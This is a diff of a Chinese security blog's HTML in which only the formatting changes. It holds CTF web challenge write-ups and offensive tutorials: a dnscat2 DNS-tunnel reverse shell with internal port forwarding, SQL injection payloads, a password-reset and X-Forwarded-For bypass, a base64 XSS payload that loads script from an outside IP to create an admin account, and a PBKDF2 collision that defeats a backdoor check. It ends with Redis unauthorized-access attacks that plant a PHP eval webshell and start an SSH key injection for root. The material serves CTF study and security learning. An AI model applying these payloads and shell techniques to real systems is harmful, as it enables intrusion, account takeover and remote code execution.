 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2841831801.png&quot; alt=&quot;2841831801&quot; /&gt;&lt;/p&gt;
 
@@ -346,9 +430,8 @@ ruby ./dnscat2.rb
 
 &lt;p&gt;将dnscat2文件夹下面的client编译好成exe，然后上传到client端&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnscat2.exe --dns=server=server端ip --secret=c2c6d04cab68ee2947d80316858da0f8
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnscat2.exe --dns=server=server端ip --secret=c2c6d04cab68ee2947d80316858da0f8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3501735141.png&quot; alt=&quot;3501735141&quot; /&gt;&lt;/p&gt;
 
@@ -357,11 +440,10 @@ ruby ./dnscat2.rb
 
 &lt;p&gt;获取shell&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session -i 1 #切换到session 1
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session -i 1 #切换到session 1
 help #通过help可以看到支持的命令
 shell  #执行之后会新生成一个session  需要通过session -i 2 切过去
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-842306562.png&quot; alt=&quot;842306562&quot; /&gt;&lt;/p&gt;
 
@@ -376,10 +458,9 @@ shell  #执行之后会新生成一个session  需要通过session -i 2 切过�
 &lt;p&gt;通过Salsa20加密算法进行了加密，如果不知道秘钥，就几乎不能解密数据包了。除了普通的反弹shell和上传下载文件功能，还有一个比较有用的功能
 可以通过dnscat2实现DNS隧道，然后进行内网渗透。在成功获取一个session之后执行&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session -i id
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session -i id
 listen 4444 10.211.55.19:22 #将内网10.211.55.19的22端口转发到本地的4444
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2557060718.png&quot; alt=&quot;2557060718&quot; /&gt;&lt;/p&gt;
 
@@ -413,33 +494,30 @@ listen 4444 10.211.55.19:22 #将内网10.211.55.19的22端口转发到本地的4
 
 &lt;p&gt;看起来是一个上传题，其实这是一个注入题。在文件名的地方存在注入。因为注入点是insert的，如果直接进行报错注入或者延时注入的话会提示sqlinject find。我们可以利用二次注入，来得到数据。通过fuzz发现，在进行insert操作的时候有三个列，所以构造&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;文件名','uid','uid'),((database()),'uid','uid')#.jpg
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;文件名','uid','uid'),((database()),'uid','uid')#.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;就可以看到回显的数据，然后通过走流程就可以查询出flag，但是有一点要注意题目直接把select from 这些关键字过滤了两次所以得构造这样的selselectect才行。&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;weeeeeb3&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;先注册一个帐号，然后找回密码，输入正确的信息。到第二步提示修改新的密码的时候，直接抓包把用户名修改为admin。然后就可以登陆admin这个帐号，然后在manage页面提示 not allow ip 我们把xxf改为127.0.0.1就可以绕过。然后要我们猜action 由于是filemanage就直接猜action＝upload 然后就出现一个上传页面，通过一轮fuzz，直接上传一个图片马，在后面写上&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script lanaguage=&quot;php&quot;&amp;gt; phpinfo()&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script lanaguage=&quot;php&quot;&amp;gt; phpinfo()&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;把后缀改为php5 就成功拿到了flag。&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;xss&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;这是一个留言板，通过fuzz发现过滤了很多标签，除此之外还把on事件直接给过滤了。后面测试发现可以使用link标签，然后使用sctf里面那种方法就可以弹框了。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;link rel=&quot;import&quot; href=&quot;data:text/html;base64,PHNjcmlwdD5kZWxldGUgYWxlcnQ7YWxlcnQoIkhlbGxvIik7PC9zY3JpcHQ+&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;link rel=&quot;import&quot; href=&quot;data:text/html;base64,PHNjcmlwdD5kZWxldGUgYWxlcnQ7YWxlcnQoIkhlbGxvIik7PC9zY3JpcHQ+&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1170534972.jpg&quot; alt=&quot;xss-1.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;查看页面的html源码发现&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--only for admin
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--only for admin
 &amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;
 username:&amp;lt;input type=&quot;text&quot; name=&quot;name&quot;&amp;gt;&amp;lt;br /&amp;gt;
 password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&amp;lt;br /&amp;gt;
@@ -448,25 +526,22 @@ password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&a
 &amp;lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;34a1615ff3eaf616f7fa205a12792d27&quot;&amp;gt;
 &amp;lt;input type=&quot;submit&quot; name=&quot;adduser&quot; value=&quot;adduser&quot;&amp;gt;
 &amp;lt;/form&amp;gt;--&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;很明显啦，就是要添加一个管理帐号帐号，发现页面使用啦jquery直接添加帐号就行。&lt;/p&gt;
 
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//180.76.178.54:8004/4b79f5d4860384d4ac494ad91f5313b7/js/jquery.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//180.76.178.54:8004/4b79f5d4860384d4ac494ad91f5313b7/js/jquery.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
                                &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                &lt;span class=&quot;na&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                &lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;name=tomato123&amp;amp;pass=tomato123&amp;amp;isadmin=1&amp;amp;adduser=adduser&amp;amp;token=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;input[name=token]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()})&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;然后构造payload&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;link rel=&quot;import&quot; href=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovLzE4MC43Ni4xNzguNTQ6ODAwNC80Yjc5ZjVkNDg2MDM4NGQ0YWM0OTRhZDkxZjUzMTNiNy9qcy9qcXVlcnkuanM+PC9zY3JpcHQ+CjxzY3JpcHQ+CiQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAicG9zdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6ICIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogIm5hbWU9dG9tYXRvMTIzJnBhc3M9dG9tYXRvMTIzJmlzYWRtaW49MSZhZGR1c2VyPWFkZHVzZXImdG9rZW49IiskKCJpbnB1dFtuYW1lPXRva2VuXSIpLnZhbCgpfSkKPC9zY3JpcHQ+&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;link rel=&quot;import&quot; href=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovLzE4MC43Ni4xNzguNTQ6ODAwNC80Yjc5ZjVkNDg2MDM4NGQ0YWM0OTRhZDkxZjUzMTNiNy9qcy9qcXVlcnkuanM+PC9zY3JpcHQ+CjxzY3JpcHQ+CiQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAicG9zdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6ICIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogIm5hbWU9dG9tYXRvMTIzJnBhc3M9dG9tYXRvMTIzJmlzYWRtaW49MSZhZGR1c2VyPWFkZHVzZXImdG9rZW49IiskKCJpbnB1dFtuYW1lPXRva2VuXSIpLnZhbCgpfSkKPC9zY3JpcHQ+&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;添加了一个帐号密码为tomato123的管理员
 访问admin.php拿到flag&lt;/p&gt;
 
@@ -488,9 +563,8 @@ password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&a
 
 &lt;p&gt;然后直接去查询里面的内容，发现只能出现RCTF这几个字符，然后就一直在纠结怎么查询，因为测试发现把substring left，right，reverse like 这些都拦截了。后面灵机一动想到了regexp。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username=tomato&quot;||updatexml(0x7c,concat((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^R'))),1)#&amp;amp;password=tomato&amp;amp;email=tomato
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username=tomato&quot;||updatexml(0x7c,concat((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^R'))),1)#&amp;amp;password=tomato&amp;amp;email=tomato
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后成功搞定&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1387239513.jpg&quot; alt=&quot;easysql－4.jpg&quot; /&gt;&lt;/p&gt;
@@ -506,9 +580,8 @@ password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&a
 
 &lt;p&gt;跑出的帐号密码为&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ROIS_ADMIN  pas5woRd_i5_45e2884c4e5b9df49c747e1d
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ROIS_ADMIN  pas5woRd_i5_45e2884c4e5b9df49c747e1d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后登陆一发。&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-460039838.jpg&quot; alt=&quot;login-3.jpg&quot; /&gt;&lt;/p&gt;
@@ -519,24 +592,23 @@ password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&a
 
 &lt;p&gt;还在html源码里面发现&lt;/p&gt;
 
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$Agent = $_SERVER['HTTP_USER_AGENT'];
-$backDoor = $_COOKIE['backdoor'];
-$msg = json_encode(&quot;no privilege&quot;);
-$iterations = 1000;
-$salt = &quot;roisctf&quot;;
-$alg = &quot;sha1&quot;;
-$keylen = &quot;20&quot;;
-if ($Agent == $backDoor || strlen($Agent) != 65) {
-    exit($msg);
-}
-if (substr($Agent,0,23) != &quot;rois_special_user_agent&quot;) {
-    exit($msg);
-}
-if (pbkdf2($alg, $Agent, $salt, $iterations, $keylen) != pbkdf2($alg, $backDoor, $salt, $iterations, $keylen)) {
-    exit($msg);
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$Agent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'HTTP_USER_AGENT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$backDoor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'backdoor'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;json_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no privilege&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$iterations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;roisctf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$alg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sha1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$keylen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;20&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Agent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$backDoor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rois_special_user_agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pbkdf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$alg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$iterations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$keylen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pbkdf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$alg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$backDoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$iterations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$keylen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;测试发现直接上传zip提示没有权限，然后只有过了上面三个条件才行。主要是第三个条件不好过，然后google一发
 pdkdf2 ctf&lt;/p&gt;
 
@@ -546,11 +618,10 @@ pdkdf2 ctf&lt;/p&gt;
 然后在https://mathiasbynens.be/notes/pbkdf2-hmac
 这篇文章里面说到这个是可以碰撞的，就是不同的明文会出现相同的密文，然后用里面提供的脚本跑一发。成功跑出来一个&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rois_special_user_agentaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaamipvkd
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rois_special_user_agentaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaamipvkd
 
 3-Rfm^Bq;ZZAcl]mS&amp;amp;eE
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后改一下ua，在cookie里面添加backdoor就可以成功上传了。&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2009859300.jpg&quot; alt=&quot;2009859300&quot; /&gt;&lt;/p&gt;
@@ -589,9 +660,8 @@ http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/382aef24
   &lt;li&gt;redis安全配置&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;测试环境 CentOS 6.5 x64
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;测试环境 CentOS 6.5 x64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;未授权访问&lt;/strong&gt;&lt;/p&gt;
 
@@ -613,7 +683,7 @@ http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/382aef24
 
 &lt;p&gt;redis-cli -h 10.211.55.10&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;config set dir /var/www/html/
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;config set dir /var/www/html/
 
 set shell &amp;lt;?php eval($_REQUEST[\'syclover\'])?&amp;gt;
 
@@ -622,8 +692,7 @@ config set dbfilename syclover.php
 save
 
 exit
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;存在的问题,如果redis里面的数据量特别大并且前面存在&amp;lt;?php 之类的符号&lt;/p&gt;
 
 &lt;p&gt;先通过randomkey来查看键值之间的规律，然后可以将数据库备份下来，找到包含&amp;lt;?php 的键名，通过 keys *str*找到真正的键名，然后去修改这个键名。因为数据量很大所以备份的shell也很大，然后在生成shell的时候，可以设置不超时，并且在生成完成之后就退出。&lt;/p&gt;
@@ -632,40 +701,35 @@ exit
 
 &lt;p&gt;&lt;strong&gt;获取root&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;victim server CentOS6.6+redis2.4  192.168.192.133
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;victim server CentOS6.6+redis2.4  192.168.192.133
 
 attack server CentOS6.6  192.168.192.132
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;先在attack server生成一个公钥&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ssh-keygen -t rsa -C &quot;redis&quot;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ssh-keygen -t rsa -C &quot;redis&quot;
 (echo -e &quot;\n\n&quot;; cat redis.pub; echo -e &quot;\n\n&quot;) &amp;gt; redis.txt
-&lt;/code&gt;&lt;/pre&gt;
